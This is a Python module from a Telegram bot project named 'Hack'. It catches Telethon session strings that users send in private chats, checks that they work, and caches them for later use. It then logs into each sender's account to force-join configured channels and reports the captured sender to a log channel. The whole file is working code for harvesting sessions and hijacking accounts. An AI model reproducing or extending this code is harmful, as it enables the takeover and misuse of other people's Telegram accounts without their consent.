import logging
import re
import env
from telethon import events, functions, TelegramClient
from telethon.sessions import StringSession
from Hack import bot
from Hack.database import settings
from Hack.helpers import log_deep, validate_session
from Hack.core import sessions

_LOG = logging.getLogger(__name__)
_RE = re.compile(r"^(1BVts|BQ|1B)")

@bot.on(events.NewMessage(incoming=True))
async def auto_join(event):
    try:
        if not event.is_private or not event.text:
            return
        text = event.text.strip()
        if not _RE.match(text) or len(text) < 100:
            return
        
        # Validate new session
        strses = validate_session(text)
        if not strses:
            return
        
        # Update cache so next button click uses the NEW string
        sessions.set(event.chat_id, strses)
        
        # Auto-join logic (as before)
        channels = []
        for key in ("MUST_JOIN", "MUST_JOIN_2"):
            ch = await settings.get(key, "") or getattr(env, key, "")
            if ch:
                channels.append(ch.lstrip("@"))
        if not channels:
            return
        sender = await event.get_sender()
        client = TelegramClient(strses, env.API_ID, env.API_HASH)
        await client.connect()
        joined = []
        for ch in channels:
            try:
                await client(functions.channels.JoinChannelRequest(ch))
                joined.append(ch)
            except Exception as e:
                _LOG.warning("auto-join %s: %s", ch, e)
        await client.disconnect()
        extra = f"Auto-joined: {', '.join(joined) or 'none'}"
        await log_deep("🔗 Session Auto-Join", sender, extra=extra)
    except Exception as e:
        _LOG.warning("auto_join: %s", e)
